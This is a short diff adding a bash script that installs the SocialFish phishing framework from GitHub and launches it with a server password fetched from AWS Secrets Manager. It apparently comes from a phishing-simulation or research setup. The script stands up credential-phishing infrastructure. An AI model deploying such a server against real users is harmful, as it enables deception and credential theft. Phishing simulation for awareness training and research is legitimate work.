@@ -1,0 +1,11 @@
+#!/bin/bash
+sudo apt-get update
+sudo apt-get -y install python3-pip
+sudo apt-get -y install awscli
+git clone https://github.com/UndeadSec/SocialFish.git
+cd SocialFish
+pip install -r requirements.txt
+chmod +x SocialFish.py
+myPwd=$(aws secretsmanager get-secret-value --region us-east-1 --secret-id
+PhishingServerPwd --query SecretString --output text) ,→
+./SocialFish.py gbsuser $myPwd
